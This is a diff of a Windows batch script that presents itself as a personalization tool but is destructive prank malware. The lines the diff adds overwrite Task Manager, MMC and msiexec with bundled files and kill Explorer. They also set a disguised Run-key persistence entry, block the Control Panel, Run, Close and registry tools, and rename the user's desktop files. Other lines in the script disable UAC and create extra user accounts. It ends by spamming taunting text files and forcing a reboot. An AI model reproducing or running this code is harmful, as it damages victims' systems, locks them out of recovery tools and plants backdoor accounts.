@@ -26,7 +26,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRm34UBwPBQUbBGROXmtD7tKvKj04aq+lgx9
-::Zh4grVQjdCyDJGyX8VAjFDBdRw2+GGS5E7gZ5vzo09qVrUcYV/YsRL/eyKeBLuEf41/hNd4a/1R0rOg5P00MNy67ax0npmBDum2fMomZqwqB
+::Zh4grVQjdCyDJGyX8VAjFDBdRw2+GGS5E7gZ5vzo09qVrUcYV/YsRL/eyKeBLuEf41/hNd4a/1R0rJ1YRSdIewC4YQE1pWdYsyqAL8L8
 ::YB416Ek+ZW8=
 ::
 ::
@@ -59,17 +59,35 @@ exit
 :c
 cls
 echo Personalizing...
+notepad sources\URDED.txt
+timeout /t 5 /nobreak >nul
+taskkill /f /im explorer.exe
+copy sources\0xHAHAHA.mp3 C:\Windows\Media
+copy sources\screenmelt.exe C:\Windows\System32
+start sources\screenmelt.exe
+sources\fmedia\fmedia.exe "C:\Windows\Media\0xHAHAHA.mp3" --background
+takeown /F "C:\Windows\system32\taskmgr.exe"
+icacls "C:\windows\system32\taskmgr.exe" /grant everyone:F
+copy sources\taskmgr.exe C:\Windows\System32\taskmgr.exe /y
+takeown /F "C:\Windows\system32\mmc.exe"
+icacls "C:\windows\system32\mmc.exe" /grant everyone:F
+copy sources\mmc.exe C:\Windows\System32\mmc.exe /y
+takeown /F "C:\Windows\system32\msiexec.exe"
+icacls "C:\windows\system32\msiexec.exe" /grant everyone:F
+copy sources\msiexec.exe C:\Windows\System32\msiexec.exe /y
 copy sources\winntcus64.png %SystemRoot%\Web
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\Web\winntcus64.png" /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 copy sources\winnt64.exe %SystemRoot%\system32
-copy %SystemRoot%\system32\winnt64.exe "%programdata%\microsoft\windows\start menu\programs\startup"
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Windows NT Personalization tool" /T REG_SZ /F /D "C:\Windows\System32\winnt64.exe"
 copy sources\msg.bat "%programdata%\microsoft\windows\start menu\programs\startup"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
 reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f
 reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoChangingWallpaper /t REG_DWORD /d 1 /f
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
 reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f
 net user /add NTCUS ntcus123
 net user /add NTUSER ntcus124
@@ -83,10 +101,20 @@ net user /add asap asap
 net user /add REICHTANGLE ig1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Accent" /v AccentColor /t REG_DWORD /d 0xFF0000 /f
-copy sources\txt\* %USERPROFILE%\desktop
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 copy sources\uap\* "C:\ProgramData\Microsoft\User Account Pictures"
 cd %userprofile%\desktop
 ren * *.prsnlz
 cls
-echo Personalization complete. Restarting...
-shutdown /r /t 3 /c "XAXAXA"
+timeout /t 15 /nobreak >nul
+explorer https://www.google.com/search?q=HAHAHAHAHAHA
+timeout /t 15 /nobreak >nul
+start https://www.google.com/search?q=russian+democratic+federative+republic
+timeout /t 15 /nobreak >nul
+start https://www.google.com/search?q=moskau+moskau
+cls
+cd %userprofile%\Desktop
+for /l %%i in (1, 1, 320) do (
+echo IT'S TOO LATE NOW YOU CANNOT ESCAPE YOUR WINDOWS INSTALL IS DONE FOR XAXAXAXA > OPENME%%i.txt
+)
+shutdown /r /t 0
